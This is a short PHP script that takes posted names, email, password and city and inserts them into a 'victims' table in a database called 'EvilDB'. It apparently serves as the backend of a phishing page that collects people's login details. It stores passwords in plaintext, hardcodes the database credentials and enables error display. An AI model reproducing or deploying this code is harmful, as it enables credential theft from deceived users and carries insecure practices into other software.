<?php

ini_set('display_errors',1);
ini_set('display_startup_erros',1);
error_reporting(E_ALL);

$nome = $_POST['nome'];
$sobre = $_POST['sobrenome'];
$email = $_POST['mail'];
$image = md5('re');
$senha = $_POST['pass'];
$cidade = $_POST['city'];

$con = new PDO(
	"mysql:host=localhost;dbname=EvilDB",
	"Tennebris",
	"password"
);

$query = $con->prepare("INSERT INTO victims(nome,sobre,image,email,senha,cidade) VALUES(:nome, :sobre, :image,:email,:senha,:cidade)");
$query->bindValue(':nome',$nome);
$query->bindValue(':sobre',$sobre);
$query->bindValue(':email',$email);
$query->bindValue(':image',$image);
$query->bindValue(':senha',$senha);
$query->bindValue(':cidade',$cidade);
$query->execute();
?>